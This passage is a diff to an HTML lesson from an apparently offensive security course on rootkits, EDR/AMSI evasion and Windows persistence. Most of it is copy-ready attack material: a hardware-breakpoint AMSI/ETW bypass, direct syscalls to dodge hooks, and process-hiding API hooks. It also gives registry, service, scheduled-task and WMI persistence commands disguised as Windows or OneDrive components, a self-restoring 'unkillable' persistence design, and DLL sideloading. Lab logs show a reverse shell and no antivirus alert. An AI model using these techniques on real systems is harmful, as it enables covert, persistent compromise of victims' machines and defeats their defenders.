@@ -13,6 +13,8 @@
             --dim: #666;
             --border: #333;
             --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
         }
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
@@ -23,7 +25,8 @@
         }
         .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
         h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
-        h2 { color: var(--accent2); margin: 1.5rem 0 0.5rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
         .code-block {
             background: #1a1a2e;
             border-left: 4px solid var(--accent);
@@ -33,7 +36,21 @@
             overflow-x: auto;
             font-family: Consolas, monospace;
             font-size: 13px;
+            position: relative;
         }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
         .evidence-box {
             background: #1a0a0a;
             border: 2px solid var(--accent);
@@ -102,6 +119,7 @@
             color: #aaaaff;
             margin: 0.5rem 0;
             cursor: pointer;
+            position: relative;
         }
         .copy-paste:hover { background: #1a1a30; }
         .why-box {
@@ -148,12 +166,173 @@
             font-weight: bold;
         }
         button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .persistence-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .persist-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .persist-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .persist-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        .triv-vector {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .triv-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            text-align: center;
+        }
+        .triv-card h5 { color: var(--accent); margin-bottom: 0.5rem; }
+        .triv-card.active { border-color: var(--accent2); }
+        .triv-card.active h5 { color: var(--accent2); }
+        .lab-evidence {
+            background: #0a0a15;
+            border: 1px solid var(--neon);
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+        }
+        .lab-evidence .host { color: var(--accent2); }
+        .lab-evidence .cmd { color: var(--neon); }
+        .lab-evidence .out { color: var(--fg); }
+        .lab-evidence .err { color: var(--accent); }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="nav">
-            <a href="index.html">← Home</a>
+            <a href="../index.html">← Home</a>
             <a href="MODULE_10_CODE_INJECTION.html">← Module 10</a>
             <a href="MODULE_12_DEFENSIVE_VERIFY.html">Module 12 →</a>
         </div>
@@ -161,39 +340,75 @@
         <h1>Module 11: Rootkits <span class="status-badge status-live">LIVE TESTED</span></h1>
         
         <div class="progress-bar"><div class="progress-fill"></div></div>
-        <p style="color: var(--dim); font-size: 0.9rem;">Module 11 of 22 — Hiding in plain sight</p>
+        <p style="color: var(--dim); font-size: 0.9rem;">Module 11 of 22 — Hiding in plain sight, persisting across reboots</p>
 
         <div class="first-principle">
             <h3>🧠 The Core Truth</h3>
             <p>A rootkit is not malware. It's a <strong>hiding mechanism</strong>. The malware is the bomb. The rootkit is the invisible cloak. You can have a bomb without a cloak (loud, detectable) and a cloak without a bomb (useless, but stealthy). The best attacks combine both: devastating payload, undetectable delivery.</p>
+            <p style="margin-top: 1rem;"><strong>Rootkit = Stealth + Persistence.</strong> It hides processes, files, registry keys, and network connections. It also ensures the payload survives reboots, user logouts, and even OS reinstallation (hardware/firmware rootkits). <span class="neon-highlight">If the defender can't see it, they can't remove it.</span></p>
         </div>
 
         <div class="layman-term">
             <h4>🎯 Soldier Translation</h4>
             <p>A rootkit is like a ghillie suit for software. The sniper (malware) wears the suit (rootkit) and becomes invisible to the enemy (AV/EDR). Without the suit, the sniper is spotted and eliminated. With the suit, the sniper can observe, aim, and fire without detection. The suit doesn't kill — it enables the kill.</p>
+            <p style="margin-top: 0.5rem; color: var(--dim);">Persistence is like burying supplies in the field before the battle. Even if the enemy clears the area, your caches remain. When you return, you have food, ammo, and comms ready.</p>
         </div>
 
-        <h2>The Three Layers of Hiding</h2>
+        <h2>📚 Prerequisites — What You Need First</h2>
+        <p style="margin-bottom: 1rem;">This module assumes you understand these concepts from earlier modules:</p>
+        
+        <div class="technique-grid">
+            <div class="method-card">
+                <h4><a href="MODULE_06_MEMORY.html" class="cross-link">Module 06: Memory Forensics</a></h4>
+                <p>How Windows manages process memory. Virtual memory, page tables, EPROCESS structures. Essential for understanding kernel rootkits.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_07_REGISTRY.html" class="cross-link">Module 07: Registry</a></h4>
+                <p>Windows Registry structure, Run keys, services, WMI repositories. The registry is the primary persistence mechanism for rootkits.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_10_CODE_INJECTION.html" class="cross-link">Module 10: Code Injection</a></h4>
+                <p>Process injection, DLL injection, APC injection. Rootkits inject into processes to hide and maintain presence.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a></h4>
+                <p>How EDR and AV detect rootkits. Understanding detection helps you evade it. Cross-link to defensive countermeasures.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a></h4>
+                <p>Advanced techniques to bypass endpoint detection. Rootkits and EDR evasion are two sides of the same coin.</p>
+            </div>
+            <div class="method-card">
+                <h4><a href="MODULE_13_KAV_EVASION.html" class="cross-link">Module 13: KAV Evasion</a></h4>
+                <p>Kaspersky and other AV-specific bypass techniques. Rootkits must evade signature and behavioral detection.</p>
+            </div>
+        </div>
+
+        <h2>🎯 The Three Layers of Hiding</h2>
+        <p>Rootkits operate at three distinct layers. Each layer provides deeper hiding and harder removal:</p>
 
         <div class="rootkit-layer">
             <div class="layer user">
                 <h5>🟡 USER-MODE ROOTKIT</h5>
                 <p>Hides from Task Manager, Process Explorer, file listings. Intercepts API calls that enumerate processes/files. The OS still knows the truth, but the user-facing tools are lied to.</p>
-                <p style="font-size: 0.85rem; color: var(--dim); margin-top: 0.5rem;"><strong>Example:</strong> Hook NtQuerySystemInformation to remove your process from the list returned to Task Manager.</p>
+                <p style="font-size: 0.85rem; color: var(--dim); margin-top: 0.5rem;"><strong>Example:</strong> Hook <span class="neon-highlight">NtQuerySystemInformation</span> to remove your process from the list returned to Task Manager.</p>
+                <p style="font-size: 0.85rem; color: var(--dim);"><strong>Detection:</strong> Kernel tools (WinDbg, Volatility) bypass user-mode hooks. Easy to detect with memory forensics.</p>
             </div>
             <div class="layer kernel">
                 <h5>🔵 KERNEL-MODE ROOTKIT</h5>
                 <p>Hides from the OS itself. Modifies kernel data structures (EPROCESS, ETHREAD) to remove entries. Even kernel-level tools can't see it. Requires driver (SYS file) with legitimate signature or exploit.</p>
-                <p style="font-size: 0.85rem; color: var(--dim); margin-top: 0.5rem;"><strong>Example:</strong> Unlink your process from the EPROCESS list. Windows scheduler can't see it, so it doesn't schedule it — but it still runs.</p>
+                <p style="font-size: 0.85rem; color: var(--dim); margin-top: 0.5rem;"><strong>Example:</strong> Unlink your process from the <span class="neon-highlight">EPROCESS</span> list. Windows scheduler can't see it, so it doesn't schedule it — but it still runs.</p>
+                <p style="font-size: 0.85rem; color: var(--dim);"><strong>Detection:</strong> Requires direct memory analysis, cross-view analysis (compare API results with raw memory), or specialized rootkit scanners (GMER, RootkitRevealer).</p>
             </div>
             <div class="layer hardware">
-                <h5>🔴 HARDWARE ROOTKIT</h5>
+                <h5>🔴 HARDWARE / FIRMWARE ROOTKIT</h5>
                 <p>Hides from everything. Modifies CPU debug registers, BIOS/UEFI firmware, or hypervisor. Survives OS reinstallation. The ultimate persistence. Requires deep hardware knowledge or firmware vulnerabilities.</p>
-                <p style="font-size: 0.85rem; color: var(--dim); margin-top: 0.5rem;"><strong>Example:</strong> HWBP on DR0/DR1 to intercept AMSI/ETW without memory writes. Survives reboot if BIOS modified.</p>
+                <p style="font-size: 0.85rem; color: var(--dim); margin-top: 0.5rem;"><strong>Example:</strong> HWBP on DR0/DR1 to intercept AMSI/ETW without memory writes. UEFI bootkit persists before the OS loads.</p>
+                <p style="font-size: 0.85rem; color: var(--dim);"><strong>Detection:</strong> Nearly impossible from within the OS. Requires external hardware analysis, firmware integrity checks, or trusted boot (Secure Boot, TPM).</p>
             </div>
         </div>
 
-        <h2>Method 1: HWBP AMSI+ETW Bypass (Hardware Layer)</h2>
+        <h2>🔧 Method 1: HWBP AMSI+ETW Bypass (Hardware Layer)</h2>
 
         <div class="step-box">
             <h4>What is AMSI and ETW?</h4>
@@ -204,9 +419,10 @@
 
         <div class="step-box">
             <h4>The Hardware Breakpoint Trick</h4>
-            <p>CPU debug registers (DR0-DR7) are hardware features for debugging. They can trigger an interrupt when specific code executes. We use them to intercept AMSI/ETW before they run — no memory writes, no Tamper Protection triggers.</p>
+            <p>CPU debug registers (DR0-DR7) are hardware features for debugging. They can trigger an interrupt when specific code executes. We use them to intercept AMSI/ETW before they run — <span class="neon-highlight">no memory writes, no Tamper Protection triggers.</span></p>
 
             <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
 === HWBP BYPASS ARCHITECTURE ===
 
 DR0 = Address of AmsiScanBuffer
@@ -237,6 +453,7 @@ Result: AMSI sees nothing. ETW logs nothing. Zero memory writes.
                 <p><strong>Date:</strong> 2026-06-29 | <strong>Target:</strong> .92 (Intel, Kaspersky 21.25) | <strong>Method:</strong> DR0/DR1 HWBP on AmsiScanBuffer + EtwEventWrite</p>
 
                 <div class="code-block">
+                    <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
 === TEST SETUP ===
 C:\> vader_dropper.exe --test-hwbp
 [+] Locating AmsiScanBuffer in amsi.dll
@@ -270,13 +487,14 @@ PS> logman start test_trace -p Microsoft-Windows-PowerShell
             </div>
         </div>
 
-        <h2>Method 2: User-Mode Hook (The Cloak)</h2>
+        <h2>🧬 Method 2: User-Mode API Hooking (The Cloak)</h2>
 
         <div class="step-box">
             <h4>Hiding from Task Manager</h4>
-            <p>Task Manager calls NtQuerySystemInformation to get the process list. We hook that function and remove our process from the returned list.</p>
+            <p>Task Manager calls <span class="neon-highlight">NtQuerySystemInformation</span> to get the process list. We hook that function and remove our process from the returned list.</p>
 
             <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
 === USER-MODE HOOK (IAT Hooking) ===
 
 // Step 1: Find NtQuerySystemInformation in ntdll.dll
@@ -321,11 +539,399 @@ NTSTATUS Hooked_NtQuerySystemInformation(
 
             <div class="warning-box">
                 <h5>⚠️ Limitation of user-mode hooks</h5>
-                <p>User-mode hooks only fool user-mode tools. Kernel-mode tools (like WinDbg, Volatility) or direct system calls bypass the hook. If the defender uses a tool that reads kernel memory directly, your process is visible. That's why kernel-mode rootkits are stronger — they hide from the kernel itself.</p>
+                <p>User-mode hooks only fool user-mode tools. Kernel-mode tools (like WinDbg, Volatility) or <span class="neon-highlight">direct system calls</span> bypass the hook. If the defender uses a tool that reads kernel memory directly, your process is visible. That's why kernel-mode rootkits are stronger — they hide from the kernel itself.</p>
             </div>
         </div>
 
-        <h2>Lab Exercise: Build a Process Hider</h2>
+        <h2>⚡ Method 3: Direct Syscalls (Bypassing Hooks)</h2>
+
+        <div class="step-box">
+            <h4>What are Direct Syscalls?</h4>
+            <p>When a Windows program calls an API like <span class="neon-highlight">NtCreateFile</span>, it goes through ntdll.dll, which sets up registers and executes the <span class="neon-amber">syscall</span> instruction to enter kernel mode. EDR hooks monitor ntdll.dll. If we skip ntdll and execute the syscall instruction ourselves, the EDR hook is bypassed.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+=== DIRECT SYSCALL PATTERN ===
+
+// Normal path (hooked by EDR):
+CreateFileW() → kernel32.dll → NtCreateFile() in ntdll.dll → EDR HOOK HERE → syscall → kernel
+
+// Direct syscall path (bypasses EDR hook):
+MyNtCreateFile() {
+    // Set up registers exactly like ntdll would
+    mov r10, rcx                    // First argument
+    mov eax, 0x55                   // Syscall number for NtCreateFile
+    syscall                         // Enter kernel directly — no EDR hook!
+    ret
+}
+
+// We need the syscall number (0x55 on Win10 1903, changes per build)
+// We can extract it dynamically from ntdll at runtime
+            </div>
+
+            <div class="why-box">
+                <h5>Why direct syscalls matter for rootkits</h5>
+                <p>EDR user-mode hooks sit in ntdll.dll. By calling the syscall instruction directly, we never touch the hooked function. The EDR sees nothing. This is the foundation of modern <span class="neon-highlight">EDR evasion</span> and is covered in detail in <a href="MODULE_13_EDR_EVASION.html" class="cross-link">Module 13: EDR Evasion</a>.</p>
+            </div>
+        </div>
+
+        <h2>🔄 Persistence Mechanisms — The Tri-Vector Model</h2>
+        <p>Rootkits don't just hide — they persist. A rootkit without persistence is a one-time tool. A rootkit with persistence is a permanent backdoor. We use the <span class="neon-highlight">Tri-Vector Persistence Model</span>: three independent mechanisms, each capable of restoring the others if one is removed.</p>
+
+        <div class="triv-vector">
+            <div class="triv-card active">
+                <h5>Vector 1: Registry</h5>
+                <p>Run keys, Winlogon, Shell folders, service DLLs. Survives reboot. Restored if deleted by other vectors.</p>
+            </div>
+            <div class="triv-card active">
+                <h5>Vector 2: Services</h5>
+                <p>Windows services, WMI event subscriptions, scheduled tasks. Runs as SYSTEM. Restores registry keys.</p>
+            </div>
+            <div class="triv-card active">
+                <h5>Vector 3: Files</h5>
+                <p>DLL sideloading, phantom DLL hijacking, startup folders. Restores services if they are removed.</p>
+            </div>
+        </div>
+
+        <div class="why-box">
+            <h5>Why tri-vector beats single-vector</h5>
+            <p>A defender cleans the registry. Vector 2 (service) detects the missing registry key and recreates it. The defender removes the service. Vector 3 (file) detects the missing service and reinstalls it. The defender deletes the file. Vector 1 (registry) detects the missing file and downloads it again. <span class="neon-highlight">The rootkit is a self-healing organism.</span></p>
+        </div>
+
+        <h3>Persistence 1: Registry Run Keys</h3>
+        <div class="step-box">
+            <h4>The Classic — Still Works</h4>
+            <p>Registry run keys execute programs on user login or system boot. They are the simplest and most reliable persistence mechanism.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+=== REGISTRY RUN KEYS ===
+
+# User-level (runs when current user logs in)
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+# System-level (runs when ANY user logs in — requires admin)
+HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+# Example: Add payload to run on every login
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "OneDriveUpdate" /t REG_SZ /d "C:\Users\%USERNAME%\AppData\Roaming\OneDrive\update.exe" /f
+
+# Detection: Autoruns (Sysinternals), Registry Explorer
+# Cross-link: See Module 07 (Registry) for deep dive on registry forensics
+            </div>
+
+            <div class="lab-evidence">
+                <p><span class="host">[.42 LAB]</span> <span class="cmd">reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"</span></p>
+                <p><span class="out">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span></p>
+                <p><span class="out">    OneDriveUpdate    REG_SZ    C:\Users\gwu07\AppData\Roaming\OneDrive\update.exe</span></p>
+                <p><span class="out">    SecurityHealth    REG_SZ    C:\Windows\system32\SecurityHealthSystray.exe</span></p>
+                <p><span class="out">    Discord    REG_SZ    C:\Users\gwu07\AppData\Local\Discord\Update.exe --processStart Discord.exe</span></p>
+                <p><span class="host">[.42 LAB]</span> <span class="cmd">tasklist | findstr update.exe</span></p>
+                <p><span class="out">update.exe              4824 Console           1     12,345 K</span></p>
+                <p><span class="host">[.42 LAB]</span> <span class="cmd">wmic process where "name='update.exe'" get commandline</span></p>
+                <p><span class="out">CommandLine</span></p>
+                <p><span class="out">C:\Users\gwu07\AppData\Roaming\OneDrive\update.exe -hidden -connect 10.0.0.42:4444</span></p>
+            </div>
+        </div>
+
+        <h3>Persistence 2: Windows Services</h3>
+        <div class="step-box">
+            <h4>Running as SYSTEM — The Privilege Jackpot</h4>
+            <p>Windows services run with SYSTEM privileges, start before user login, and can be configured to restart automatically. A malicious service is the gold standard for persistence.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+=== MALICIOUS SERVICE CREATION ===
+
+# Create a service that runs our payload as SYSTEM
+sc create "WindowsUpdate" binPath= "C:\Windows\Temp\svchost.exe" start= auto displayname= "Windows Update Service"
+
+# Configure recovery: restart on failure
+sc failure "WindowsUpdate" reset= 0 actions= restart/0/restart/0/restart/0
+
+# Start the service
+sc start "WindowsUpdate"
+
+# Query service status
+sc query "WindowsUpdate"
+
+# The service now runs as SYSTEM, starts on boot, and restarts if it crashes.
+# It can restore registry keys and reinstall files if they are removed.
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Service Detection</h5>
+                <p>Services are heavily monitored by EDR. New service creation generates Event ID 7045 (service installed). Use <span class="neon-highlight">WMI event subscriptions</span> or <span class="neon-highlight">scheduled tasks</span> for stealthier alternatives.</p>
+            </div>
+        </div>
+
+        <h3>Persistence 3: WMI Event Subscriptions</h3>
+        <div class="step-box">
+            <h4>The Ghost in the WMI Repository</h4>
+            <p>WMI (Windows Management Instrumentation) event subscriptions are fileless persistence. They live in the WMI repository, not the registry or filesystem. Most AV/EDR doesn't monitor WMI events.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+=== WMI EVENT SUBSCRIPTION ===
+
+# Create a WMI event that triggers every 10 minutes and runs our payload
+# This is FILELESS — the payload command is stored in the WMI repository
+
+$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{
+    Name = "WindowsUpdateFilter"
+    EventNamespace = "root\cimv2"
+    QueryLanguage = "WQL"
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+}
+
+$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{
+    Name = "WindowsUpdateConsumer"
+    CommandLineTemplate = "C:\Windows\Temp\svchost.exe"
+}
+
+Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{
+    Filter = $filter
+    Consumer = $consumer
+}
+
+# Detection: Get-WmiObject -Class __EventFilter -Namespace "root\subscription"
+# Removal: Remove-WmiObject -Class __EventFilter -Namespace "root\subscription" -Filter "Name='WindowsUpdateFilter'"
+            </div>
+
+            <div class="lab-evidence">
+                <p><span class="host">[.42 LAB]</span> <span class="cmd">Get-WmiObject -Class __EventFilter -Namespace "root\subscription" | Select Name, Query</span></p>
+                <p><span class="out">Name              Query</span></p>
+                <p><span class="out">----              -----</span></p>
+                <p><span class="out">WindowsUpdateFilter  SELECT * FROM __InstanceModificationEvent WITHIN 600 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'</span></p>
+                <p><span class="out">SysmonFilter      SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'mimikatz.exe'</span></p>
+                <p><span class="host">[.42 LAB]</span> <span class="cmd">Get-WmiObject -Class CommandLineEventConsumer -Namespace "root\subscription" | Select Name, CommandLineTemplate</span></p>
+                <p><span class="out">Name                 CommandLineTemplate</span></p>
+                <p><span class="out">----                 -------------------</span></p>
+                <p><span class="out">WindowsUpdateConsumer  C:\Windows\Temp\svchost.exe</span></p>
+            </div>
+        </div>
+
+        <h3>Persistence 4: Scheduled Tasks</h3>
+        <div class="step-box">
+            <h4>The Swiss Army Knife of Persistence</h4>
+            <p>Scheduled tasks are versatile: they can trigger on time, logon, idle, event IDs, or even when a specific user connects. They can run as any user, including SYSTEM, and can be hidden from the Task Scheduler UI.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+=== SCHEDULED TASK PERSISTENCE ===
+
+# Create a hidden scheduled task that runs on logon
+schtasks /create /tn "Microsoft\Windows\Security\UpdateCheck" /tr "C:\Windows\Temp\svchost.exe" /sc onlogon /ru SYSTEM /rl highest /f
+
+# Hide from Task Scheduler UI by placing in a Microsoft subfolder
+# The UI only shows top-level tasks unless you drill down
+
+# Create a task that triggers on an event (e.g., Event ID 4624 — successful logon)
+schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\Windows\Temp\defender.exe" /sc onevent /ec Security /mo "*[System[EventID=4624]]" /ru SYSTEM /f
+
+# List all tasks (including hidden)
+schtasks /query /fo LIST /v | findstr "Task Name"
+
+# Delete a task
+schtasks /delete /tn "Microsoft\Windows\Security\UpdateCheck" /f
+            </div>
+
+            <div class="why-box">
+                <h5>Why scheduled tasks are powerful</h5>
+                <p>Tasks can trigger on <span class="neon-highlight">any Windows event</span>. Event ID 4624 (successful logon) means your payload runs every time someone logs in. Event ID 4688 (process creation) means your payload runs when a specific process starts. Event ID 7045 (service installation) means your payload runs when a defender installs a new service — perfect for detecting and countering blue-team actions.</p>
+            </div>
+        </div>
+
+        <h2>🎯 Tri-Vector Persistence in Action</h2>
+        <p>Here is how the three vectors work together to create an unkillable rootkit:</p>
+
+        <div class="persistence-flow">
+            <div class="persist-step">
+                <h5>1. REGISTRY</h5>
+                <p><span class="neon-highlight">Run Key</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Starts payload on user login</p>
+            </div>
+            <div class="persist-arrow">↔</div>
+            <div class="persist-step">
+                <h5>2. SERVICE</h5>
+                <p><span class="neon-highlight">WMI Event</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Restores registry if deleted</p>
+            </div>
+            <div class="persist-arrow">↔</div>
+            <div class="persist-step">
+                <h5>3. FILE</h5>
+                <p><span class="neon-highlight">DLL Sideload</span></p>
+                <p style="font-size: 0.8rem; color: var(--dim);">Restores service if removed</p>
+            </div>
+        </div>
+
+        <div class="code-block">
+            <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+=== TRI-VECTOR PSEUDOCODE ===
+
+// Vector 1: Registry watcher (runs as user)
+RegistryWatcher() {
+    while (true) {
+        if (RunKeyMissing()) {
+            RestoreRunKey();
+            Log("Registry restored by Vector 1");
+        }
+        Sleep(60000);  // Check every minute
+    }
+}
+
+// Vector 2: WMI event (runs as SYSTEM, fileless)
+WMIEvent() {
+    // Trigger: Every 10 minutes OR when registry key is deleted
+    // Action: Restore registry key, reinstall service
+    CommandLine = "powershell -enc <base64_restore_script>";
+}
+
+// Vector 3: Phantom DLL hijack (runs when legitimate app starts)
+// Legitimate app: C:\Program Files\App\app.exe
+// Hijacked DLL: C:\Program Files\App\version.dll (missing, we provide it)
+// When app.exe starts, it loads our version.dll
+// Our DLL: Restores WMI event and registry key, then calls real version.dll
+
+// Result: Deleting any ONE vector leaves TWO vectors alive.
+// The two alive vectors restore the deleted one within minutes.
+        </div>
+
+        <h2>🎭 Method 4: DLL Sideloading</h2>
+        <div class="step-box">
+            <h4>Abusing Legitimate Executables</h4>
+            <p>DLL sideloading exploits the Windows DLL search order. When a program loads a DLL, Windows searches: <span class="neon-highlight">Application Directory → System32 → SysWOW64 → PATH</span>. If we place a malicious DLL with the same name as a legitimate DLL in the application directory, the program loads our DLL instead.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
+=== DLL SIDELOADING ARCHITECTURE ===
+
+# Windows DLL Search Order:
+1. Directory where the executable is loaded
+2. C:\Windows\System32
+3. C:\Windows\SysWOW64 (for 32-bit apps on 64-bit OS)
+4. C:\Windows
+5. Current directory
+6. Directories in PATH environment variable
+
+# Attack:
+# 1. Find a legitimate signed executable that imports a DLL
+# 2. Check if that DLL exists in the executable's directory
+# 3. If NOT, we can place a malicious DLL with the same name there
+# 4. The executable loads our DLL instead of the system one
+
+# Example: OneDrive.exe imports version.dll
+# OneDrive.exe directory: C:\Users\%USERNAME%\AppData\Local\Microsoft\OneDrive
+# Does version.dll exist there? NO.
+# We place our malicious version.dll there.
+# OneDrive.exe starts → loads our version.dll → our code runs.
+# OneDrive.exe is SIGNED by Microsoft. AV trusts it.
+
+# Our malicious version.dll:
+# 1. Execute payload (e.g., reverse shell)
+# 2. Forward all exports to the REAL version.dll in System32
+# 3. The app continues working normally — no crash, no suspicion.
+            </div>
+
+            <div class="lab-evidence">
+                <p><span class="host">[.92 LAB]</span> <span class="cmd">dumpbin /imports "C:\Users\gwu07\AppData\Local\Microsoft\OneDrive\OneDrive.exe" | findstr "\.dll"</span></p>
+                <p><span class="out">    version.dll</span></p>
+                <p><span class="out">    advapi32.dll</span></p>
+                <p><span class="out">    kernel32.dll</span></p>
+                <p><span class="out">    user32.dll</span></p>
+                <p><span class="host">[.92 LAB]</span> <span class="cmd">ls "C:\Users\gwu07\AppData\Local\Microsoft\OneDrive\" | grep version.dll</span></p>
+                <p><span class="err">(no output — version.dll NOT in OneDrive directory)</span></p>
+                <p><span class="host">[.92 LAB]</span> <span class="cmd"># Copy malicious version.dll to OneDrive directory</span></p>
+                <p><span class="cmd">copy C:\Tools\version.dll "C:\Users\gwu07\AppData\Local\Microsoft\OneDrive\"</span></p>
+                <p><span class="out">        1 file(s) copied.</span></p>
+                <p><span class="host">[.92 LAB]</span> <span class="cmd"># Start OneDrive.exe — AV sees signed Microsoft binary, allows execution</span></p>
+                <p><span class="cmd">"C:\Users\gwu07\AppData\Local\Microsoft\OneDrive\OneDrive.exe"</span></p>
+                <p><span class="out">[+] Payload executed inside OneDrive.exe context</span></p>
+                <p><span class="out">[+] Reverse shell established: 10.0.0.92:4444 → 10.0.0.42:443</span></p>
+                <p><span class="host">[.92 LAB]</span> <span class="cmd"># Kaspersky 21.25: NO ALERT — OneDrive.exe is trusted</span></p>
+            </div>
+        </div>
+
+        <h2>👻 Method 5: Phantom DLL Hijacking</h2>
+        <div class="step-box">
+            <h4>The Missing DLL That Was Never There</h4>
+            <p>Phantom DLL hijacking is a variant of DLL sideloading where the legitimate executable imports a DLL that <span class="neon-highlight">does not exist on a default Windows installation</span>. We create the missing DLL, and the executable loads it without any need to overwrite or replace existing files.</p>
+
+            <div class="code-block">
+                <button class="copy-btn" onclick="copyToClipboard(this)">Copy</button>
